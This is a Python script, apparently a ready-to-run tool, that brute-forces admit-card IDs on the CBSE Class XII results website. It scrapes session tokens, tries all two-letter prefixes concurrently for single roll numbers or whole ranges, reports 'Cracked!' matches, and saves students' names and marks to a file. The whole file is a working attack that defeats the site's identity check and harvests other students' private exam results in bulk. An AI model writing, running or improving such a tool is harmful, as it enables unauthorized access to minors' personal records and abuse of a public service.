import concurrent.futures
import itertools
import os
import sys
import time
import requests

LANDING_URL = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii26.htm"
POST_URL = "https://cbseresults.nic.in/class_xii_b_2026_a/ClassTwelfth_ii_2026.asp"
MAX_THREADS = 20

def derive_admit_card_id(prefix, roll_no, school_no, centre_middle_two):
    return f"{prefix.upper()}{str(roll_no)[-2:]}{str(school_no)[:2]}{centre_middle_two}"

def quick_extract_tokens():
    """Fetches a fresh token pair on a clean session pipeline."""
    try:
        with requests.Session() as s:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            r = s.get(LANDING_URL, headers=headers, timeout=4)
            if r.status_code == 200:
                sfid = r.text.split('name="as_sfid" value="')[1].split('"')[0]
                fid = r.text.split('name="as_fid" value="')[1].split('"')[0]
                return {"as_sfid": sfid, "as_fid": fid}
    except:
        pass
    return {"as_sfid": "", "as_fid": ""}

def parse_and_format_result(html_text, roll_no, matched_admid):
    try:
        candidate = html_text.split("Candidate Name:</font>")[1].split("<b>")[1].split("</b>")[0].strip()
        rows = html_text.split("<tr bg")
        
        subjects_list = []
        total_marks = 0
        counted_subjects = 0
        
        for row in rows:
            if 'color="white"' in row or 'Result :' in row or 'SUB CODE' in row:
                continue
            cells = row.split("<font face=\"Arial\" size=2>")
            if len(cells) >= 6:
                sub_name = cells[2].split("</font>")[0].strip()
                marks_str = cells[5].split("&nbsp;")[0].split("</font>")[0].strip()
                if marks_str.isdigit():
                    score = int(marks_str)
                    subjects_list.append(f"  {sub_name:<30} : {score}/100")
                    if counted_subjects < 5:
                        total_marks += score
                        counted_subjects += 1
                        
        if counted_subjects == 0: return None
        percentage = (total_marks / (counted_subjects * 100)) * 100
        output = [
            f"Roll Number : {roll_no}",
            f"Candidate   : {candidate} ({matched_admid})",
            "--------------------------------------------------",
        ]
        output.extend(subjects_list)
        output.extend([
            "--------------------------------------------------",
            f"TOTAL MARKS : {total_marks}/{counted_subjects * 100}  |  PERCENTAGE: {percentage:.2f}%",
            "==================================================\n"
        ])
        return "\n".join(output)
    except:
        return None

def test_prefix_worker(prefix, roll_no, school_no, mid_digits, token_pool):
    """Worker function designed to execute an isolated concurrent guess."""
    admid = derive_admit_card_id(prefix, roll_no, school_no, mid_digits)
    token = random.choice(token_pool) if token_pool else {"as_sfid": "", "as_fid": ""}
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": LANDING_URL
    }
    payload = {
        "regno": str(roll_no),
        "sch": str(school_no),
        "admid": admid,
        "B2": "Submit",
        "as_sfid": token["as_sfid"],
        "as_fid": token["as_fid"]
    }

    try:
        res = requests.post(POST_URL, data=payload, headers=headers, timeout=3)
        if res.status_code == 200 and not any(x in res.text.lower() for x in ["invalid", "alert", "not found"]):
            return {"prefix": prefix, "html": res.text, "admid": admid}
    except:
        pass
    return None

if __name__ == "__main__":
    import random
    print("=== CBSE HYPER-THREADED TURBO CHECKER ===")
    
    # Dynamic inputs asked right at prompt initiation
    school_input = input("Enter School Number: ").strip()
    roll_input = input("Enter Roll Number OR Range (e.g., 15624517): ").strip()
    mid_digits = input("Enter the 2 middle digits of Centre No (e.g., 22): ").strip()

    roll_list = []
    if "-" in roll_input:
        start_roll, end_roll = map(int, roll_input.split("-"))
        roll_list = list(range(start_roll, end_roll + 1))
    else:
        roll_list = [int(roll_input)]

    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    all_prefixes = ["".join(p) for p in itertools.product(letters, repeat=2)]

    print("[*] Instantiating high-speed session token pool allocation...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as token_executor:
        token_pool = [t for t in token_executor.map(lambda _: quick_extract_tokens(), range(10)) if t["as_sfid"]]

    compiled_results = ["==================================================",
                        "          CBSE PERFORMANCE BATCH REPORT           ",
                        "==================================================\n"]
    
    found_count = 0
    start_time = time.time()

    for current_roll in roll_list:
        print(f"Crack execution initiated on Roll: {current_roll}... ", end="", flush=True)
        match_found = False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            # Passes your dynamic console school entry straight to the tracking worker threads
            futures = [executor.submit(test_prefix_worker, pref, current_roll, school_input, mid_digits, token_pool) for pref in all_prefixes]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    executor.shutdown(wait=False, cancel_futures=True)
                    
                    parsed_report = parse_and_format_result(result["html"], current_roll, result["admid"])
                    if parsed_report:
                        print(f"-> Cracked! [ID: {result['admid']}]")
                        compiled_results.append(parsed_report)
                        found_count += 1
                        match_found = True
                        break
            
        if not match_found:
            print("-> Match not found in entire matrix.")

    if found_count > 0:
        elapsed = time.time() - start_time
        print(f"\n[+] Processing Completed. Processed batch records in {elapsed:.2f} seconds.")
        
        filename = f"Turbo_Batch_Results_{roll_list[0]}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(compiled_results))
        os.system(f"notepad.exe {filename}")
